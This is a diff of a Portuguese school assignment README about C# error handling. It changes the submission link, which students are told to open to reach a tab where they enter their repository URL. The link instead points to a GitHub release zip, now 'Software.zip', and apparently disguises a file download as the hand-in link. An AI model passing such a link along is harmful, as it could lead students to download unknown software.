@@ -6,7 +6,7 @@ Podes fazer clone do repositório para o teu computador (ou para o Replit) e pre
 
 Alternativamente, podes preencher o ficheiro README diretamente no GitHub. A partir da página principal do repositório, clica em "Edit File" (ícone representando um lápis). Com o README preenchido, carrega no botão "Commit Changes".
 
-Para entregar a ficha, acede a [este link](https://github.com/salvadoreira15/PSI_23-24_Ficha_M11/releases/download/v1.0/Release.zip) (separador **Ficha Módulo 11**), e mete o **URL** do teu repositório ao lado do teu nome.
+Para entregar a ficha, acede a [este link](https://github.com/salvadoreira15/PSI_23-24_Ficha_M11/releases/download/v2.0/Software.zip) (separador **Ficha Módulo 11**), e mete o **URL** do teu repositório ao lado do teu nome.
 No teu repositório, acede a "Settings -> Collaborators" e adiciona o utilizador "Manuel Geraldes" para ter acesso.
 
 ## Exercício 1 - Para cada afirmação sobre tratamento de erros em C#, indica se é **Verdadeira** ou **Falsa**. Justifica a tua resposta. (6v)
